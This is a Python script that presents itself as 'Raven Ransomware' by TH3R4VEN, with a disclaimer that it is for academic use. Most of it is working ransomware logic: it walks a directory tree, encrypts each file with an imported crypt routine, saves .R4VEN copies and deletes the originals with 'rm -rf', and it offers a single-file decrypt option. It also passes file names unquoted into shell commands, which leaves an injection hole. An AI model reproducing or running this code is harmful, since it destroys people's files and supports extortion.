#!/usr/bin/env python
#  Copyright (c) 2020.
#  This code was designed and created by TH3R4VEN, its use is encouraged for academic and professional purposes.
#  I am not responsible for improper or illegal uses
#  Follow me on GitHub: https://github.com/th3r4ven

import subprocess as command
import os
import re
from ransomware_menager import crypt, decrypt

print("[+]\t Raven Ransomware created by TH3R4VEN\n")
print("1-Crypt 2-Decrypt")
opt = int(input(">"))


def listDirectories(Dirpath):
    for resultado in os.listdir(Dirpath):
        result2 = os.popen("file " + Dirpath + resultado)
        for arq in result2:
            if not re.search(r'directory', arq):
                files.append(Dirpath + resultado)
            else:
                listDirectories(Dirpath + resultado + "/")


if opt == 1:
    path = "directory path to encrypt (full path works better /home/kali/Documents/)" # Remember to put a / at the end
    files = []
    directories = []
    listagem = (os.listdir(path))

    for file in listagem:
        result = os.popen("file " + path + file)
        for resu in result:
            if not re.search(r"directory", resu):
                files.append(str(path + file))
            else:
                directories.append(path + file + "/")

    for direc in directories:
        listDirectories(direc)

    for arquivo in files:
        with open(arquivo, 'rb') as arq:
            content = arq.read()
        arq.close()
        cryptedContent = crypt(content)

        filePath = arquivo.split('.')[0]
        with open(filePath + ".R4VEN", 'wb') as arq:
            arq.write(cryptedContent)
        arq.close()

        command.run(['rm', '-rf', arquivo])

elif opt == 2:
    print("Current working directory: " + command.getoutput('pwd'))
    decryptFilePath = input("Path to file> ")

    if re.search(r'.R4VEN', decryptFilePath):
        with open(decryptFilePath, 'rb') as arq:
            content = arq.read()
        arq.close()

        content = decrypt(content)
        filePath = decryptFilePath.split('.R4VEN')[0]
        with open(filePath, 'wb')as arq:
            arq.write(content)
        arq.close()

        command.run(['rm', '-rf', decryptFilePath])

else:
    exit()
